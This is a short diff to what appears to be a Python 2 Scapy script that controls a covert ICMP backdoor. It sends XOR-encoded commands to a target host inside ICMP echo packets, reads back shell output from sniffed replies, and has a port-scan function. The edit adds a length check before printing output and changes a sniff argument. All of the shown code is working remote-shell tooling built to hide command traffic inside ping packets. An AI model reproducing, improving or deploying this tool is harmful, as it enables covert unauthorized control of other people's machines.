@@ -49,9 +49,10 @@ def action(pkt):
                 elif buff[4:8] == port:
                         print "Port"
                 elif buff[4:8] == shell:
-                        sys.stdout.write(buff[8:])
-    			sys.stdout.flush()
-			sendp(packet_builder(shell + raw_input()), verbose=0, iface=sys.argv[2])
+			if len(buff) > 4:
+                        	sys.stdout.write(buff[8:])
+    				sys.stdout.flush()
+				sendp(packet_builder(shell + raw_input()), verbose=0, iface=sys.argv[2])
 
 def packet_builder(data):
 	packet = Ether() / IP(dst=sys.argv[1]) / ICMP(type=8) / (XOR(client_magic + data))
@@ -73,7 +74,7 @@ def port_scan(ip):
 
 def command_shell():
 	sendp(packet_builder(shell), verbose=0, iface=sys.argv[2])
-	sniff(iface=sys.argv[2],filter="icmp",prn=action,store=1)
+	sniff(iface=sys.argv[2],filter="icmp",prn=action)
         menu()
 
 menu()
